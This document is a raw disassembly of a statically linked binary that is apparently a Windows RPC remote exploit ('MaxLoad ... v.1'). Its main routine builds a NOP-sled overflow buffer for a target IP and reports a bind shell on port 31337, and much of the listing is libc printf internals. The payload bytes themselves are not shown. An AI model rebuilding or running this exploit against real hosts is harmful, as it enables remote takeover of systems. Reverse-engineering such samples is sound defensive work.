xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff0
push eax
push esp
push edx
push 0x8048ae0
push 0x8048a80
push ecx
push esi
push main
call fcn.08048510
hlt
push ebp
mov eax, 0
xor edx, edx
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1ec
test eax, eax
mov edi, dword [arg_1ch]
mov esi, dword [arg_ch]
mov ebx, dword [arg_10h]
lea ecx, [ebx + esi*4 + 4]
je 0x8048543
mov eax, dword [0]
test eax, eax
mov eax, 1
cmove edx, eax
mov eax, dword [arg_20h]
mov dword [0x80a95f8], edx
mov dword [0x80aa840], ecx
mov edx, ecx
mov dword [0x80aac00], eax
lea esi, [esi]
mov eax, dword [edx]
add edx, 4
test eax, eax
jne 0x8048560
mov eax, edx
call fcn.08056000
call fcn.08048a30
test edi, edi
je 0x8048591
mov dword [var_8h], 0
mov dword [var_4h], 0
mov dword [esp], edi
call fcn.080493c0
mov eax, dword [0x80aa840]
mov dword [var_4h], ebx
mov dword [esp], esi
mov dword [var_8h], eax
call fcn.08056490
mov ecx, dword [arg_18h]
test ecx, ecx
je 0x80485c8
mov eax, dword [arg_18h]
mov dword [var_8h], 0
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.080493c0
mov edx, dword [0x80a95f4]
test edx, edx
jne 0x80485fc
mov eax, dword [arg_14h]
test eax, eax
je 0x80485dc
call dword [arg_14h]
call fcn.08048b80
mov dword [esp], esi
mov dword [var_4h], ebx
mov eax, dword [0x80aa840]
mov dword [var_8h], eax
call dword [arg_8h]
mov dword [esp], eax
call fcn.08049300
call fcn.080486b0
jmp 0x80485d2
push ebp
mov ebp, esp
sub esp, 0x38
and esp, 0xfffffff0
mov eax, 0
sub esp, eax
mov eax, dword [str._b__t_b_]
add eax, 0x251
mov dword [var_ch], eax
mov dword [var_10h], 0
mov dword [var_14h], 0
mov dword [var_18h], 0
mov dword [var_20h], 0
mov dword [var_24h], 0
cmp dword [argv], 2
je 0x80482ef
mov dword [esp], str._MaxLoad__windows_rpc_exploit__v.1__n
call fcn.08049bb0
mov dword [esp], str.For_educational_propose_only__n_n
call fcn.08049bb0
mov dword [esp], str.error:_you_must_enter_a_valid_ip_n
call fcn.08049bb0
mov eax, dword [envp]
mov eax, dword [eax]
mov dword [var_4h], eax
mov dword [esp], str.usage:_s__IP_ADDRESS__n
call fcn.08049bb0
mov eax, dword [envp]
mov eax, dword [eax]
mov dword [var_4h], eax
mov dword [esp], str.e.g:__s_192.168.1.23_n_n
call fcn.08049bb0
mov dword [var_10h], 1
mov dword [var_4h], 0x8092700
mov eax, dword [var_ch]
mov dword [esp], eax
call fcn.0804a250
mov dword [var_8h], eax
cmp dword [var_8h], 0
je 0x804836c
mov dword [var_sp_8h], 0
mov dword [var_4h], 0
mov eax, dword [var_8h]
mov dword [esp], eax
call fcn.0804b400
mov dword [esp], 2
call fcn.08053f20
mov eax, dword [str._b__t_b_]
mov dword [var_sp_8h], eax
mov dword [var_4h], 0x8092702
mov eax, dword [var_8h]
mov dword [esp], eax
call fcn.08049b80
mov eax, dword [var_8h]
mov dword [esp], eax
call fcn.08049dc0
mov dword [var_4h], 0x1ff
mov eax, dword [var_ch]
mov dword [esp], eax
call fcn.08053ea0
lea eax, [var_bp_4h]
add eax, 8
mov dword [var_bp_4h], eax
mov eax, dword [var_bp_4h]
mov dword [eax], 0x80a9020
cmp dword [var_10h], 0
jne 0x80484fb
lea eax, [var_20h]
mov dword [var_sp_8h], eax
mov dword [var_4h], 0x8092705
mov eax, dword [envp]
add eax, 4
mov eax, dword [eax]
mov dword [esp], eax
call fcn.08049be0
cmp eax, 1
je 0x80483c4
mov dword [esp], str.error_in_ip_address:_sscanf
call fcn.08049ce0
mov dword [esp], 1
call fcn.08049300
cmp dword [argv], 2
jle 0x80483dd
mov eax, dword [envp]
add eax, 8
mov eax, dword [eax]
mov dword [esp], eax
call fcn.080492d0
mov dword [var_24h], eax
cmp dword [var_24h], 0
js 0x80483eb
cmp dword [var_24h], 3
jg 0x80483eb
jmp 0x8048403
mov dword [esp], str.error:_alignment_could_not_be_done
call fcn.08049ce0
mov dword [esp], 1
call fcn.08049300
mov dword [var_sp_8h], 4
mov dword [var_4h], str.:___
mov eax, dword [var_1ch]
mov dword [esp], eax
call fcn.08053530
lea eax, [var_18h]
add dword [eax], 4
mov dword [var_sp_8h], 0xbb8
mov dword [var_4h], 0x90
mov eax, dword [var_18h]
add eax, dword [var_1ch]
mov dword [esp], eax
call fcn.080536f0
lea eax, [var_18h]
add dword [eax], 0xbb8
mov dword [var_sp_8h], 3
mov eax, dword [str._b__t_b_]
mov dword [var_4h], eax
mov eax, dword [var_18h]
add eax, dword [var_1ch]
mov dword [esp], eax
call fcn.08053770
lea eax, [var_18h]
add dword [eax], 3
mov edx, dword [var_24h]
lea eax, [var_18h]
add dword [eax], edx
mov dword [var_14h], 0
cmp dword [var_14h], 0x7cc
jbe 0x804848a
jmp 0x80484b2
mov dword [var_sp_8h], 4
lea eax, [var_20h]
mov dword [var_4h], eax
mov eax, dword [var_18h]
add eax, dword [var_1ch]
add eax, dword [var_14h]
mov dword [esp], eax
call fcn.08053770
lea eax, [var_14h]
add dword [eax], 4
jmp 0x804847f
mov eax, dword [var_14h]
add eax, dword [var_18h]
add eax, dword [var_1ch]
mov byte [eax], 0x5d
mov eax, dword [var_14h]
add eax, dword [var_18h]
add eax, dword [var_1ch]
inc eax
mov byte [eax], 0
mov dword [esp], str._MaxLoad__windows_rpc_exploit__v.1__n
call fcn.08049bb0
mov dword [esp], str.For_educational_propose_only__n_n
call fcn.08049bb0
mov eax, dword [envp]
add eax, 4
mov eax, dword [eax]
mov dword [var_4h], eax
mov dword [esp], str.Successfully_send_payload__nTry_connect_to__s_port_31337_n_n
call fcn.08049bb0
mov eax, 0
leave
ret
pop ebx
add ebx, 0x61ad7
push eax
mov eax, dword [ebx + 0xc]
test eax, eax
je 0x8048181
call eax
mov ebx, dword [var_4h]
leave
ret
pop edx
add edx, 0x61a47
sub esp, 0x18
test eax, eax
je 0x804822a
mov dword [var_ch], edx
xor ecx, ecx
mov edx, 0x80a9c64
mov dword [var_8h], ecx
mov dword [var_4h], edx
mov dword [esp], section..eh_frame
call section.
mov eax, dword [section..jcr]
test eax, eax
je 0x8048250
mov eax, 0
test eax, eax
je 0x8048250
mov dword [esp], section..jcr
call eax
lea esi, [esi]
lea edi, [edi]
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0xc
lea eax, [arg_ch]
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [var_4h], eax
mov eax, dword [0x80a9500]
mov dword [esp], eax
call fcn.08064160
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x58c
mov dword [var_4a8h], 0
mov esi, dword [arg_ch]
call fcn.08048b20
mov ecx, dword [arg_8h]
mov edx, dword [eax]
mov dword [var_4c8h], edx
mov edx, dword [ecx + 0x5c]
test edx, edx
jne 0x806419c
mov dword [ecx + 0x5c], 0xffffffff
mov edx, 0xffffffff
inc edx
mov ecx, 0xffffffff
jne 0x80641ce
mov edi, dword [arg_8h]
mov edx, dword [edi]
test dl, 8
jne 0x8067601
test esi, esi
je 0x80675f1
and edx, 2
je 0x80641d8
mov ecx, dword [arg_10h]
mov eax, dword [arg_8h]
mov edx, esi
call fcn.08067ab0
mov ecx, eax
lea esp, [var_ch]
mov eax, ecx
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_10h]
lea edx, [var_444h]
mov dword [var_4ach], 0xffffffff
mov dword [var_4c4h], 0
mov dword [var_444h], 0
mov dword [var_440h], 0
mov dword [var_4c0h], eax
mov dword [esp], esi
mov dword [var_4h], edx
call fcn.08074610
mov ecx, dword [arg_8h]
mov dword [var_4cch], 0
mov dword [var_4b4h], eax
mov dword [var_44ch], eax
movzx edx, word [ecx]
test dx, dx
js 0x8064270
mov eax, 0
test eax, eax
je 0x8064270
lea eax, [var_40ch]
mov dword [var_4cch], 1
mov dword [var_4h], fcn.08074580
mov dword [var_8h], ecx
mov dword [esp], eax
call section.
mov edi, dword [arg_8h]
movzx edx, word [edi]
nop
test dx, dx
jns 0x80675e1
mov edx, dword [arg_8h]
mov ebx, dword [var_4b4h]
mov eax, dword [edx + 0x94]
sub ebx, esi
mov dword [esp], edx
mov dword [var_8h], ebx
mov dword [var_4h], esi
call dword [eax + 0x1c]
mov dword [var_4b0h], 0xffffffff
cmp eax, ebx
je 0x80642e6
mov edx, dword [arg_8h]
cmp word [edx], 0
jns 0x80642dc
mov ecx, dword [var_4cch]
test ecx, ecx
jne 0x80642c4
mov ecx, dword [var_4b0h]
jmp 0x80641ce
lea eax, [var_40ch]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x80642b9
mov dword [esp], edx
call fcn.08074580
jmp 0x80642af
mov edx, dword [var_44ch]
mov dword [var_4b0h], eax
cmp byte [edx], 0
je 0x80642a6
mov eax, edx
lea ecx, [var_14h]
mov dword [var_4d8h], 0
inc edx
mov dword [var_4dch], 0
mov dword [var_4e0h], 0
mov dword [var_44ch], edx
mov dword [var_4e4h], 0
mov dword [var_4e8h], 0
mov dword [var_4ech], 0
mov dword [var_4f0h], 0
mov dword [var_4f4h], 0
mov dword [var_4f8h], 0
mov dword [var_4fch], 0
mov dword [var_500h], 0xffffffff
mov dword [var_504h], 0
mov byte [var_505h], 0x20
mov dword [var_4b8h], 0
mov dword [var_4bch], ecx
mov edx, case.0x80643c0.32
movzx eax, byte [eax + 1]
mov byte [var_506h], al
sub eax, 0x20
cmp al, 0x5a
ja case.default.0x80648b6
movsx eax, byte [var_506h]
mov eax, dword [eax*4 + 0x80a09e0]
mov edx, dword [eax*4 + 0x80a0be0]
lea esi, [esi]
jmp edx
mov dword [var_4dch], 1
lea esi, [esi]
mov eax, dword [var_44ch]
lea edx, [eax + 1]
mov dword [var_44ch], edx
mov edx, case.0x80643c0.32
movzx eax, byte [eax + 1]
mov byte [var_506h], al
sub eax, 0x20
cmp al, 0x5a
ja case.default.0x80648b6
jmp 0x80643a8
mov dword [var_4e4h], 1
jmp 0x80643d0
mov dword [var_4e0h], 1
mov byte [var_505h], 0x20
jmp 0x80643d0
mov dword [var_4d8h], 1
jmp 0x80643d0
mov eax, dword [var_4e0h]
test eax, eax
jne 0x80643d0
mov byte [var_505h], 0x30
jmp 0x80643d0
cmp dword [var_4ach], 0xffffffff
mov dword [var_4e8h], 1
jne 0x80643d0
mov ebx, 0
test ebx, ebx
je 0x80644b5
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
test ebx, ebx
mov eax, dword [eax + 0x28]
mov dword [var_4a8h], eax
je 0x80644ae
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x2c]
mov dword [var_4ach], eax
movzx eax, byte [eax]
test al, al
je 0x806449f
cmp al, 0x7f
je 0x806449f
mov edi, dword [var_4a8h]
cmp byte [edi], 0
jne 0x80643d0
mov dword [var_4ach], 0
jmp 0x80643d0
mov eax, dword [0x80a9ab4]
jmp 0x8064479
mov eax, dword [0x80a9ab4]
jmp 0x806445d
lea esi, [esi]
mov eax, dword [var_44ch]
lea edx, [eax + 1]
mov dword [var_44ch], edx
mov dword [var_448h], edx
movzx eax, byte [eax + 1]
sub eax, 0x30
cmp eax, 9
jbe 0x80675b7
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
test eax, eax
mov dword [var_4fch], eax
js 0x8067599
mov ebx, dword [var_4fch]
add ebx, 0x20
cmp ebx, 0x3e7
jle 0x806453e
cmp ebx, 0x1000
ja 0x806755e
mov eax, dword [var_4fch]
mov edx, dword [var_4fch]
add eax, 0x32
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_23h_2]
and eax, 0xfffffff0
lea eax, [edx + eax + 0x20]
mov dword [var_4bch], eax
mov eax, dword [var_44ch]
movzx eax, byte [eax]
mov byte [var_506h], al
mov edx, case.0x80643c0.32
sub eax, 0x20
cmp al, 0x5a
ja case.default.0x80648b6
movsx eax, byte [var_506h]
mov eax, dword [eax*4 + 0x80a09e0]
mov edx, dword [eax*4 + 0x80a0c60]
jmp edx
mov edx, dword [0x80aad28]
xor edi, edi
test edx, edx
je 0x8064599
mov ecx, dword [var_4c4h]
mov esi, dword [var_51ch]
lea eax, [ecx + ecx*2]
shl eax, 4
mov eax, dword [esi + eax + 8]
mov edi, dword [edx + eax*4]
test edi, edi
mov eax, fcn.08067610
mov edx, dword [var_51ch]
cmove edi, eax
mov eax, dword [var_4c4h]
lea esi, [eax + eax*2]
shl esi, 4
mov ebx, dword [edx + esi + 0x2c]
xor edx, edx
lea eax, [ebx*4 + 0x10]
sub esp, eax
lea ecx, [var_23h]
and ecx, 0xfffffff0
cmp edx, ebx
jae 0x80645f0
mov eax, dword [var_51ch]
mov esi, dword [eax + esi + 0x24]
lea eax, [esi + esi*2]
mov esi, dword [var_524h]
lea eax, [esi + eax*4]
mov dword [ecx + edx*4], eax
add eax, 0xc
inc edx
cmp edx, ebx
jb 0x80645e5
mov dword [var_8h_2], ecx
mov edx, dword [var_4c4h]
lea eax, [edx + edx*2]
shl eax, 4
add eax, dword [var_51ch]
mov dword [var_4h_2], eax
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call edi
test eax, eax
js 0x8064cc0
add dword [var_4b0h], eax
mov esi, dword [var_574h]
test esi, esi
jne 0x806754b
mov eax, dword [var_4c4h]
mov ecx, dword [var_51ch]
mov edi, dword [arg_8h]
lea ebx, [eax + eax*2]
shl ebx, 4
mov edx, dword [edi + 0x94]
mov eax, dword [ecx + ebx + 0x18]
sub eax, dword [ecx + ebx + 0x14]
mov dword [var_8h_2], eax
mov eax, dword [ecx + ebx + 0x14]
mov dword [esp], edi
mov dword [var_4h_2], eax
call dword [edx + 0x1c]
mov esi, dword [var_51ch]
mov edx, eax
mov eax, dword [esi + ebx + 0x18]
sub eax, dword [esi + ebx + 0x14]
cmp edx, eax
jne 0x8064cc0
inc dword [var_4c4h]
add dword [var_4b0h], edx
mov edi, dword [var_514h]
cmp dword [var_4c4h], edi
jae 0x8064cca
mov edi, dword [var_4c4h]
mov eax, dword [var_51ch]
mov dword [var_574h], 0
lea ecx, [edi + edi*2]
shl ecx, 4
movzx ebx, byte [eax + ecx + 0xc]
mov eax, ebx
shr al, 3
mov edx, eax
mov eax, ebx
shr al, 4
and edx, 1
mov esi, eax
mov dword [var_540h], edx
mov eax, ebx
shr al, 5
and esi, 1
mov edi, eax
mov dword [var_544h], esi
mov eax, ebx
shr al, 6
and edi, 1
mov esi, ebx
mov edx, eax
mov dword [var_548h], edi
and esi, 1
mov eax, ebx
and edx, 1
mov dword [var_554h], esi
shr al, 7
mov dword [var_54ch], edx
movzx eax, al
mov dword [var_550h], eax
mov eax, ebx
shr al, 1
mov edi, eax
mov eax, dword [var_51ch]
and edi, 1
mov dword [var_558h], edi
movzx edx, byte [eax + ecx + 0xd]
mov eax, ebx
shr al, 2
mov edi, eax
mov eax, dword [var_51ch]
and edi, 1
shr dl, 1
mov dword [var_560h], edi
mov esi, edx
mov eax, dword [eax + ecx + 4]
shr dl, 2
and esi, 1
mov edi, edx
mov edx, dword [var_51ch]
mov dword [var_55ch], esi
and edi, 1
mov esi, dword [var_51ch]
mov dword [var_564h], eax
mov dword [var_56ch], edi
mov eax, dword [var_51ch]
movzx edx, byte [edx + ecx + 8]
mov esi, dword [esi + ecx]
movzx eax, byte [eax + ecx + 0x10]
mov dword [var_568h], esi
mov byte [var_56eh], dl
mov esi, dword [var_51ch]
mov byte [var_56dh], al
mov eax, dword [esi + ecx + 0x20]
cmp eax, 0xffffffff
je 0x80647d0
mov edi, dword [var_524h]
lea eax, [eax + eax*2]
mov eax, dword [edi + eax*4]
test eax, eax
mov dword [esi + ecx + 4], eax
js 0x806752f
mov eax, dword [var_51ch]
mov ecx, dword [eax + ecx + 4]
mov dword [var_564h], ecx
mov ecx, dword [var_4c4h]
mov esi, dword [var_51ch]
lea edx, [ecx + ecx*2]
shl edx, 4
mov eax, dword [esi + edx + 0x1c]
cmp eax, 0xffffffff
je 0x8064811
mov edi, dword [var_524h]
lea eax, [eax + eax*2]
mov eax, dword [edi + eax*4]
test eax, eax
mov dword [esi + edx], eax
js 0x8067523
mov eax, dword [var_51ch]
mov edx, dword [eax + edx]
mov dword [var_568h], edx
mov edx, dword [var_568h]
cmp dword [var_564h], edx
mov eax, edx
cmovge eax, dword [var_564h]
add eax, 0x20
cmp eax, 0x3e8
jle 0x806488a
cmp dword [var_564h], edx
mov eax, edx
cmovge eax, dword [var_564h]
add eax, 0x20
cmp eax, 0x1000
ja 0x80674c5
mov ecx, dword [var_568h]
cmp dword [var_564h], ecx
mov eax, ecx
cmovge eax, dword [var_564h]
add eax, 0x32
and eax, 0xfffffffc
sub esp, eax
mov eax, ecx
lea edx, [var_23h]
and edx, 0xfffffff0
cmp dword [var_564h], ecx
cmovge eax, dword [var_564h]
lea edx, [eax + edx + 0x20]
mov dword [var_4bch], edx
movzx eax, byte [var_56eh]
mov edx, case.0x80648b6.32
sub eax, 0x20
cmp al, 0x5a
ja case.default.0x80648b6
movsx eax, byte [var_56eh]
mov eax, dword [eax*4 + 0x80a09e0]
mov edx, dword [eax*4 + 0x80a0ee0]
jmp edx
cmp byte [var_506h], 0
je 0x8064cc0
sub esp, 0x610
mov dword [var_514h], 0
mov dword [var_518h], 0x20
lea edi, [var_23h]
mov dword [var_520h], 0
mov dword [var_47ch], 0
and edi, 0xfffffff0
cmp dword [var_4ach], 0xffffffff
mov dword [var_51ch], edi
je 0x8064c57
mov edx, dword [var_4b4h]
mov dword [var_44ch], edx
cmp byte [edx], 0
je 0x8064a4a
mov ecx, dword [var_514h]
lea ecx, [ecx + ecx*2]
shl ecx, 4
mov dword [var_584h], ecx
mov esi, dword [var_518h]
cmp dword [var_514h], esi
jb 0x80649e0
mov ebx, esi
mov edi, dword [var_51ch]
add ebx, ebx
lea eax, [ebx + ebx*2]
mov dword [var_518h], ebx
shl eax, 4
mov dword [var_528h], edi
add eax, 0x10
sub esp, eax
lea eax, [var_23h]
and eax, 0xfffffff0
mov dword [var_51ch], eax
mov eax, edi
add eax, dword [var_584h]
cmp dword [var_51ch], eax
je 0x8064c46
mov ecx, dword [var_584h]
mov edi, dword [var_51ch]
cld
mov esi, dword [var_528h]
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
test byte [var_584h], 2
mov edx, edi
je 0x80649b7
movzx eax, word [esi]
add edx, 2
add esi, 2
mov word [edi], ax
test byte [var_584h], 1
je 0x80649c5
movzx eax, byte [esi]
mov byte [edx], al
mov eax, dword [var_51ch]
add eax, dword [var_584h]
cmp dword [var_528h], eax
je 0x8064c46
lea esi, [esi]
lea eax, [var_444h]
lea edx, [var_47ch]
mov dword [var_10h], eax
mov dword [var_sp_ch], edx
mov eax, dword [var_51ch]
mov ebx, dword [var_584h]
add eax, ebx
mov dword [var_8h_2], eax
mov ecx, dword [var_520h]
mov dword [var_4h_2], ecx
mov eax, dword [var_44ch]
mov dword [esp], eax
call fcn.08074690
mov esi, dword [var_51ch]
add dword [var_584h], 0x30
add dword [var_520h], eax
inc dword [var_514h]
mov eax, dword [esi + ebx + 0x18]
mov dword [var_44ch], eax
cmp byte [eax], 0
jne 0x8064934
mov edi, dword [var_47ch]
mov eax, dword [var_520h]
cld
cmp edi, eax
cmovae eax, edi
mov ecx, eax
mov dword [var_52ch], eax
shl ecx, 2
lea eax, [ecx + 0x10]
shr ecx, 2
sub esp, eax
xor eax, eax
lea edx, [var_23h]
and edx, 0xfffffff0
mov edi, edx
mov dword [var_530h], edx
rep stosd dword es:[edi], eax
mov ecx, dword [var_52ch]
lea eax, [ecx + ecx*2]
lea eax, [eax*4 + 0x10]
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov dword [var_534h], esi
mov dword [var_524h], esi
xor esi, esi
cmp esi, dword [var_514h]
jae 0x8064b3f
mov ebx, dword [var_51ch]
xor edi, edi
add ebx, 0x2c
mov eax, dword [ebx - 0xc]
cmp eax, 0xffffffff
je 0x8064ad5
mov edx, dword [var_530h]
mov dword [edx + eax*4], 0
mov eax, dword [ebx - 0x10]
cmp eax, 0xffffffff
je 0x8064aea
mov ecx, dword [var_530h]
mov dword [ecx + eax*4], 0
mov eax, dword [ebx]
test eax, eax
je 0x8064b30
dec eax
je 0x8064c32
mov eax, dword [0x80aad94]
mov edx, dword [var_530h]
mov ecx, dword [ebx - 0x24]
mov dword [var_580h], eax
mov eax, dword [ebx - 8]
lea eax, [edx + eax*4]
mov dword [var_8h_2], eax
mov eax, dword [ebx]
mov dword [var_4h_2], eax
mov eax, dword [var_51ch]
add eax, edi
mov dword [esp], eax
mov edx, dword [var_580h]
call dword [edx + ecx*4]
nop
inc esi
add edi, 0x30
add ebx, 0x30
cmp esi, dword [var_514h]
jb 0x8064ac0
xor esi, esi
cmp esi, dword [var_52ch]
jae 0x8064b92
mov ebx, dword [var_534h]
nop
mov ecx, dword [var_530h]
mov eax, dword [ecx + esi*4]
cmp eax, 5
je 0x8064b75
jg 0x8064bbd
cmp eax, 2
je 0x8064b75
jg 0x8064bb3
test eax, eax
je 0x8064b75
cmp eax, 1
je 0x8064b75
test ah, 8
je 0x8064ba3
mov eax, dword [var_4c0h]
add dword [var_4c0h], 4
mov eax, dword [eax]
mov dword [ebx], eax
inc esi
add ebx, 0xc
cmp esi, dword [var_52ch]
jb 0x8064b50
mov esi, dword [var_514h]
cmp dword [var_4c4h], esi
jmp 0x8064693
xor eax, eax
xor edx, edx
xor ecx, ecx
mov dword [ebx], eax
mov dword [ebx + 4], edx
mov dword [ebx + 8], ecx
jmp 0x8064b86
cmp eax, 3
je 0x8064b75
cmp eax, 4
jmp 0x8064b6e
cmp eax, 0x100
je 0x8064c18
jg 0x8064be3
cmp eax, 6
je 0x8064bd0
cmp eax, 7
jne 0x8064b70
mov eax, dword [var_4c0h]
add dword [var_4c0h], 8
fld qword [eax]
fstp qword [ebx]
jmp 0x8064b86
cmp eax, 0x200
je 0x8064b75
jg 0x8064c0e
cmp eax, 0x107
jne 0x8064b70
mov eax, dword [var_4c0h]
add dword [var_4c0h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
jmp 0x8064ba9
cmp eax, 0x400
jmp 0x8064b6e
mov eax, dword [var_4c0h]
add dword [var_4c0h], 8
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [ebx + 4], edx
jmp 0x8064b84
mov edx, dword [ebx - 8]
mov eax, dword [ebx - 4]
mov ecx, dword [var_530h]
mov dword [ecx + edx*4], eax
jmp 0x8064b30
mov eax, ebx
shr eax, 1
add ebx, eax
mov dword [var_518h], ebx
jmp 0x80649e0
mov ebx, 0
test ebx, ebx
je 0x8064cb9
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
test ebx, ebx
mov eax, dword [eax + 0x28]
mov dword [var_4a8h], eax
je 0x8064cb2
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x2c]
mov dword [var_4ach], eax
movzx eax, byte [eax]
test al, al
je 0x8064ca3
cmp al, 0x7f
jne 0x806490d
mov dword [var_4ach], 0
jmp 0x806490d
mov eax, dword [0x80a9ab4]
jmp 0x8064c88
mov eax, dword [0x80a9ab4]
jmp 0x8064c6c
mov dword [var_4b0h], 0xffffffff
mov ebx, dword [var_4b8h]
test ebx, ebx
je 0x80642a6
mov eax, dword [var_4b8h]
mov dword [esp], eax
call fcn.08051180
jmp 0x80642a6
mov edi, dword [var_4c4h]
mov edx, dword [var_51ch]
lea eax, [edi + edi*2]
shl eax, 4
add edx, eax
jne 0x8064e39
lea ebx, [var_43ch]
mov eax, edx
mov ecx, 5
cld
mov edi, ebx
mov edx, dword [var_568h]
rep stosd dword es:[edi], eax
movsx eax, byte [var_56eh]
mov ecx, dword [var_564h]
mov dword [var_43ch], edx
mov dword [var_438h], ecx
movzx ecx, byte [var_554h]
mov dword [var_434h], eax
movzx eax, byte [var_558h]
and ecx, 1
and eax, 1
add eax, eax
movzx edx, byte [var_430h]
and edx, 0xfffffffc
or edx, ecx
movzx ecx, byte [var_560h]
or edx, eax
movzx eax, byte [var_540h]
and edx, 0xfffffff3
and ecx, 1
shl ecx, 2
and eax, 1
shl eax, 3
or edx, ecx
movzx ecx, byte [var_544h]
or edx, eax
movzx eax, byte [var_548h]
and edx, 0xffffffcf
and ecx, 1
shl ecx, 4
and eax, 1
shl eax, 5
or edx, ecx
movzx ecx, byte [var_550h]
or edx, eax
movzx eax, byte [var_54ch]
and edx, 0x3f
shl ecx, 7
and eax, 1
shl eax, 6
or edx, eax
movsx eax, byte [var_56dh]
or edx, ecx
mov byte [var_430h], dl
mov dword [var_42ch], eax
mov eax, dword [var_554h]
test eax, eax
je 0x8064e28
mov eax, dword [arg_10h]
add dword [arg_10h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_418h], edx
mov dword [var_414h], ecx
mov dword [var_41ch], eax
lea eax, [var_41ch]
mov dword [var_484h], eax
mov dword [var_4h_2], ebx
lea eax, [var_484h]
mov dword [var_8h_2], eax
mov esi, dword [arg_8h]
mov dword [esp], esi
call fcn.0806a140
jmp 0x8064612
mov eax, dword [arg_10h]
add dword [arg_10h], 8
fld qword [eax]
fstp qword [ebp - 0x41c]
jmp 0x8064dfe
mov edi, dword [var_51ch]
mov ecx, dword [var_524h]
mov eax, dword [edi + eax + 0x24]
lea eax, [eax + eax*2]
lea eax, [ecx + eax*4]
mov dword [var_484h], eax
mov dword [var_4h_2], edx
jmp 0x8064e0e
mov eax, 0
mov edi, esp
test eax, eax
je 0x8064fac
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x58]
mov dword [var_488h], 0
mov dword [var_48ch], 0
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_48ch]
mov dword [var_8h_2], eax
lea esi, [var_23h]
mov eax, dword [var_4c4h]
and esi, 0xfffffff0
lea edx, [eax + eax*2]
mov eax, dword [var_51ch]
shl edx, 4
add eax, edx
test eax, eax
jne 0x8064f91
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov dword [var_4h_2], eax
mov dword [esp], esi
call fcn.08077b00
cmp eax, 0xffffffff
mov ebx, eax
je 0x8064f80
sub dword [var_564h], eax
mov eax, dword [var_548h]
test eax, eax
jne 0x8064f21
mov eax, dword [var_564h]
test eax, eax
jle 0x8064f21
mov ecx, dword [var_564h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], ecx
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08075680
add dword [var_4b0h], eax
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x8064f80
add dword [var_4b0h], ebx
mov ebx, dword [var_548h]
test ebx, ebx
je 0x8064f79
mov ecx, dword [var_564h]
test ecx, ecx
jle 0x8064f79
mov ecx, dword [var_564h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], ecx
mov esi, dword [arg_8h]
mov dword [esp], esi
call fcn.08075680
add dword [var_4b0h], eax
mov esp, edi
jmp 0x8064620
mov dword [var_4b0h], 0xffffffff
mov esp, edi
jmp 0x8064cca
mov ecx, dword [var_51ch]
mov eax, dword [ecx + edx + 0x24]
mov edx, dword [var_524h]
lea eax, [eax + eax*2]
mov eax, dword [edx + eax*4]
jmp 0x8064ecd
mov eax, dword [0x80a9ab4]
jmp 0x8064e76
lea eax, [var_3fch]
mov dword [var_8h_2], 0x3e8
mov dword [var_4h_2], eax
mov eax, dword [var_4c8h]
mov dword [esp], eax
call fcn.08053300
mov esi, eax
mov dword [var_560h], 0
test esi, esi
mov dword [var_578h], 0
je 0x806536e
mov edx, dword [var_560h]
test edx, edx
jne 0x80651e3
cmp byte [var_56eh], 0x53
je 0x80651e3
cmp dword [var_568h], 0xffffffff
je 0x80651d9
mov eax, 0
test eax, eax
je 0x80651cf
mov dword [esp], 3
call section.
mov eax, dword [eax]
cmp dword [eax + 0x58], 1
je 0x80651b6
mov edx, dword [var_568h]
mov edi, esp
mov dword [var_498h], esi
mov dword [var_494h], 0
mov dword [var_490h], 0
lea eax, [edx*4 + 0x10]
sub esp, eax
lea eax, [var_494h]
mov dword [var_10h], eax
lea edx, [var_23h]
lea eax, [var_498h]
mov ecx, dword [var_568h]
and edx, 0xfffffff0
mov dword [var_4h_2], eax
mov dword [esp], edx
mov dword [var_sp_ch], ecx
mov dword [var_8h_2], ecx
call fcn.08078100
inc eax
je 0x8064f80
mov eax, dword [var_498h]
test eax, eax
jne 0x80651a2
mov dword [esp], esi
call fcn.08053400
mov ebx, eax
mov esp, edi
sub dword [var_564h], ebx
js 0x8065178
mov eax, dword [var_548h]
test eax, eax
jne 0x8065101
mov eax, dword [var_564h]
test eax, eax
jle 0x8065101
mov eax, dword [var_564h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], eax
mov edx, dword [arg_8h]
mov dword [esp], edx
call fcn.08075680
add dword [var_4b0h], eax
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x94]
mov dword [esp], ecx
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x8064cc0
mov eax, dword [var_548h]
add dword [var_4b0h], ebx
test eax, eax
je 0x806515d
mov eax, dword [var_564h]
test eax, eax
jle 0x806515d
mov edi, dword [var_564h]
mov dword [var_4h_2], 0x20
